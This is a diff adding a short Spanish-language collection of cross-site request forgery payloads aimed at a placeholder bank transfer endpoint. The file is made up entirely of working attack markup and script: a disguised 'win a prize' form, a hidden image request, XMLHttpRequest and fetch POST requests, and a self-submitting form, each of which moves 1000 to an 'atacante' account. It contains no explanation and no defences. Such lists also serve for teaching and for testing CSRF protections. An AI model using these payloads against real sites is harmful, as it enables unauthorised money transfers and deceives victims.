@@ -1,0 +1,33 @@
+▶ Formulario Malicioso (Engañar al usuario):
+  <form action="http://banco.com/transferir" method="POST">
+    <input type="hidden" name="destinatario" value="atacante">
+    <input type="hidden" name="cantidad" value="1000">
+    <input type="submit" value="¡Gana un premio!">
+  </form>
+
+▶ Petición Automática (Ejecutar con imagen):
+  <img src="http://banco.com/transferir?destinatario=atacante&cantidad=1000" style="display:none" />
+
+▶ CSRF con XMLHttpRequest (Petición POST dinámica):
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://banco.com/transferir", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("destinatario=atacante&cantidad=1000");
+  </script>
+
+▶ CSRF con Fetch API (Petición moderna):
+  <script>
+    fetch('http://banco.com/transferir', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: 'destinatario=atacante&cantidad=1000'
+    });
+  </script>
+
+▶ CSRF con Autoenvío (Enviar formulario automáticamente):
+  <form action="http://banco.com/transferir" method="POST" id="csrf">
+    <input type="hidden" name="destinatario" value="atacante">
+    <input type="hidden" name="cantidad" value="1000">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
